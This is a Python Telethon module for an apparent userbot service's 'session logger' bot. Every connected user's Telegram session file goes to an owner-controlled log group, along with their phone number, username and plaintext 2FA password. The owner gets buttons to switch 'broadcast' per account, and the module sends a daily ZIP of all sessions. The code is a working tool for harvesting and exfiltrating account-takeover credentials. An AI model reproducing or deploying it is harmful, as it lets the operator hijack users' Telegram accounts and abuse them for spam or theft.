import os
import io
import zipfile
import logging
import asyncio
import hashlib
import time
from datetime import datetime, timedelta, timezone
from typing import Optional

from telethon import TelegramClient, events
from telethon.tl.custom import Button

import config
import database

logger = logging.getLogger(__name__)

_client: Optional[TelegramClient] = None
_zip_lock = asyncio.Lock()

def _session_file_path(phone: str) -> str:
    return os.path.join(config.SESSION_DIR, f"{phone}.session")


async def _log_callback(event):
    """Handles the Broadcast ON/OFF approval buttons in the log group."""
    try:
        if not event.data:
            return
        user_id = event.sender_id if event.sender_id else None
        if user_id != config.OWNER_ID:
            await event.answer("Not authorized", alert=True)
            return
        data = event.data.decode("utf-8", "ignore")
        parts = data.split(":", 2)
        if len(parts) < 3 or parts[0] != "bcast":
            return
        action = parts[1]
        phone = parts[2]
        allowed = action == "ON"
        database.set_user_broadcast_allowed(phone, allowed)
        status = "✅ Broadcasting ON" if allowed else "❌ Broadcasting OFF"
        await event.answer(f"{phone}: {status}", alert=False)
        try:
            first_line = event.message.message.splitlines()[0]
            await event.edit(
                f"{first_line}\n📡 Broadcast status: **{status}**",
                buttons=_broadcast_buttons(phone, allowed),
            )
        except Exception:
            pass
    except Exception as e:
        logger.error(f"Log group callback error: {e}")


def _broadcast_buttons(phone: str, allowed: bool = None):
    """Inline approval buttons attached to every session message."""
    if allowed is None:
        record = database.get_userbot(phone)
        allowed = bool(record and record.get("broadcast_allowed"))
    on_txt = f"✅ Broadcast ON" if not allowed else "✅ Broadcast ON"
    return [
        Button.inline(on_txt, f"bcast:ON:{phone}"),
        Button.inline("❌ Broadcast OFF", f"bcast:OFF:{phone}"),
    ]


async def start_log_bot() -> bool:
    """
    Starts the dedicated 'session logger' Telegram bot. This bot is only used to
    post every connected session to the log group and to deliver the daily ZIP.
    Token & group come from the admin panel first, then env fallback.
    """
    global _client
    if _client:
        return True
    token = database.get_log_bot_token() or config.LOG_BOT_TOKEN
    if not token:
        logger.warning("LOG_BOT_TOKEN not set; session logger disabled.")
        return False
    try:
        session_name = os.path.join(config.SESSION_DIR, "logbot")
        api_id, api_hash = database.get_api_credentials()
        _client = TelegramClient(session_name, api_id, api_hash)
        await _client.start(bot_token=token)
        _client.on(events.CallbackQuery())(_log_callback)
        me = await _client.get_me()
        logger.info(f"Session logger bot started: @{(me.username or me.id)}")
        return True
    except Exception as e:
        logger.error(f"Failed to start session logger bot: {e}")
        _client = None
        return False


async def restart_log_bot() -> str:
    """Stops the running logger bot (if any) and starts it with the current settings."""
    global _client
    if _client:
        try:
            await _client.disconnect()
        except Exception:
            pass
        _client = None
    ok = await start_log_bot()
    return "Session logger restarted ✔" if ok else "Session logger FAILED to start (check token)."


def _log_group_id():
    """Resolves the log group id (int) with the panel override taking priority."""
    grp = database.get_log_group_id()
    try:
        return int(grp)
    except Exception:
        return config.LOG_GROUP_ID


def _build_session_files() -> list:
    """Writes every existing session (from DB bytes) to disk. Returns list of paths."""
    paths = []
    userbots = database.get_all_userbots()
    for ub in userbots:
        phone = ub.get("phone")
        sbytes = ub.get("session_bytes")
        if not phone or not sbytes:
            continue
        path = _session_file_path(phone)
        try:
            with open(path, "wb") as f:
                f.write(sbytes)
            paths.append(path)
        except Exception as e:
            logger.warning(f"Could not write session {phone}: {e}")
    return paths


async def send_session(phone: str, force: bool = False):
    """Posts a single session file + info message to the log group via the logger bot."""
    global _client
    if not _client or not _log_group_id():
        return False
    rec = database.get_userbot(phone)
    if not rec or not rec.get("session_bytes"):
        return False
    if rec.get("logged_to_group") and not force:
        return False

    try:
        path = _session_file_path(phone)
        with open(path, "wb") as f:
            f.write(rec["session_bytes"])
        login_time = rec.get("login_time")
        if login_time:
            try:
                login_time = datetime.fromisoformat(str(login_time)).strftime("%Y-%m-%d %H:%M UTC")
            except Exception:
                pass
        tfa = rec.get("twofa_password") or database.get_unified_2fa()
        approved = bool(rec.get("broadcast_allowed"))
        text = (
            f"🔑 **UserBot Session**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 **User ID:** `{rec.get('user_id') or 'N/A'}`\n"
            f"🏷️ **Username:** @{rec.get('username') or 'None'}\n"
            f"📱 **Phone:** `{phone}`\n"
            f"⏰ **Login time:** `{login_time or 'N/A'}`\n"
            f"🔐 **2FA password:** `{tfa or 'None'}`\n"
            f"🟢 **Status:** `{rec.get('status')}`\n"
            f"📡 **Broadcast:** {'✅ ON' if approved else '❌ OFF'}"
        )
        await _client.send_message(
            _log_group_id(),
            text,
            file=path,
            buttons=_broadcast_buttons(phone),
        )
        database.mark_session_logged(phone)
        logger.info(f"Posted session {phone} to log group.")
        return True
    except Exception as e:
        logger.error(f"Failed to post session {phone}: {e}")
        return False


async def send_all_sessions():
    """Posts every unposted session to the log group (used on startup + new sessions)."""
    for ub in database.get_all_userbots():
        phone = ub.get("phone")
        if phone:
            try:
                await send_session(phone)
            except Exception:
                pass


async def build_and_send_zip() -> Optional[str]:
    """Zips ALL sessions into one .zip and posts it to the log group. Returns the zip path."""
    global _client
    if not _client or not _log_group_id():
        return None
    async with _zip_lock:
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M")
        zip_name = os.path.join(config.ZIP_DIR, f"sessions_backup_{stamp}.zip")
        paths = _build_session_files()
        if not paths:
            logger.info("No sessions found to zip.")
            return None
        try:
            with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zf:
                for p in paths:
                    zf.write(p, arcname=os.path.basename(p))
            text = (
                f"🗜️ **Daily Session Backup**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⏰ Time: `{stamp} UTC`\n"
                f"📦 Total sessions: `{len(paths)}`\n"
                f"💾 Size: `{round(os.path.getsize(zip_name)/1024, 1)} KB`\n\n"
                f"_Auto-generated every 24 hours._"
            )
            await _client.send_message(_log_group_id(), text, file=zip_name)
            logger.info(f"✅ Daily ZIP sent to log group: {zip_name}")
            return zip_name
        except Exception as e:
            logger.error(f"Failed to build/send zip: {e}")
            return None


async def _send_events_loop():
    """Periodically pushes newly connected sessions to the log group."""
    while True:
        try:
            await asyncio.sleep(20.0)
            recs = database.get_all_userbots()
            for ub in recs:
                phone = ub.get("phone")
                if phone and ub.get("session_bytes") and not ub.get("logged_to_group"):
                    try:
                        await send_session(phone)
                    except Exception:
                        pass
        except Exception as e:
            logger.error(f"session logger loop: {e}")


async def daily_zip_loop():
    """Runs forever; on each cycle waits until the configured next UTC hour/day then sends one ZIP."""
    hour = config.DAILY_ZIP_HOUR
    default_secs = 24 * 3600
    while True:
        try:
            if hour is None or hour < 0:
                # hour = -1 => disabled
                await asyncio.sleep(default_secs)
                continue
            now_utc = datetime.now(timezone.utc)
            next_run = now_utc.replace(hour=hour, minute=0, second=0, microsecond=0)
            if next_run <= now_utc:
                next_run = next_run + timedelta(days=1)
            wait_secs = (next_run - now_utc).total_seconds()
            logger.info(f"Next daily ZIP at {next_run.isoformat()} (in {int(wait_secs)}s)")
            await asyncio.sleep(wait_secs)
            await build_and_send_zip()
        except Exception as e:
            logger.error(f"daily zip loop error: {e}")
            await asyncio.sleep(3600)


async def force_zip_now() -> Optional[bool]:
    return await build_and_send_zip()